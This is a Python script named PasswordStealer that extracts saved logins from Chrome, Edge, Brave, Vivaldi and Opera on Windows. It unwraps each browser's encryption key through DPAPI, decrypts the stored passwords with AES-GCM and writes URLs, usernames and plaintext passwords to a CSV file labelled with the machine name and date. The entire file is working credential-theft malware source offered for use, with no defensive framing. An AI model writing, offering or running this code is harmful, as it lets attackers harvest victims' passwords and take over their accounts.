import os
import json
import base64
import sqlite3
import shutil
import csv
import socket
from datetime import datetime
import win32crypt  # Requires pywin32
from Crypto.Cipher import AES  # Requires pycryptodome

class PasswordStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)
        self.local_app_data = os.getenv('LOCALAPPDATA')
        self.app_data = os.getenv('APPDATA')
        
    def get_encryption_key(self, local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove 'DPAPI' prefix
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error extracting encryption key from {local_state_path}: {e}")
            return None

    def decrypt_password(self, buffer, key):
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except Exception as e:
            # print(f"Error decrypting password: {e}")
            return None

    def extract_from_browser(self, browser_name, user_data_path, profile_path="Default"):
        key_path = os.path.join(user_data_path, "Local State")
        db_path = os.path.join(user_data_path, profile_path, "Login Data")

        if not os.path.exists(key_path) or not os.path.exists(db_path):
            return []

        key = self.get_encryption_key(key_path)
        if not key:
            return []

        temp_db = os.path.join(self.output_dir, f"{browser_name}_LoginData.db")
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            results = []
            for url, username, encrypted_password in cursor.fetchall():
                if not username or not encrypted_password:
                    continue
                
                decrypted_password = self.decrypt_password(encrypted_password, key)
                if decrypted_password:
                    results.append([browser_name, url, username, decrypted_password])
            
            return results
        except Exception as e:
            print(f"Error reading DB for {browser_name}: {e}")
            return []
        finally:
            conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)

    def run(self):
        browsers = {
            "Chrome": os.path.join(self.local_app_data, r"Google\Chrome\User Data"),
            "Edge": os.path.join(self.local_app_data, r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(self.local_app_data, r"BraveSoftware\Brave-Browser\User Data"),
            "Vivaldi": os.path.join(self.local_app_data, r"Vivaldi\User Data"),
            "Opera": os.path.join(self.app_data, r"Opera Software\Opera Stable") # Opera key might be different usually, but trying standard method
        }

        all_creds = []
        for name, path in browsers.items():
            print(f"Checking {name}...")
            # Opera uses slightly different structure sometimes, but "Local State" is usually in root of User Data
            creds = self.extract_from_browser(name, path)
            all_creds.extend(creds)
            print(f"Found {len(creds)} credentials in {name}")

        if all_creds:
            pc_name = socket.gethostname()
            date_str = datetime.now().strftime("%d-%m-%y")
            output_file = os.path.join(self.output_dir, f"Passwords_{pc_name}_{date_str}.csv")
            
            with open(output_file, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Browser", "URL", "Username", "Password"])
                writer.writerows(all_creds)
            
            print(f"Passwords saved to: {output_file}")
            return output_file
        else:
            print("No passwords found.")
            return None

if __name__ == "__main__":
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    OUTPUT_DIR = os.path.join(BASE_DIR, "output")
    stealer = PasswordStealer(OUTPUT_DIR)
    stealer.run()
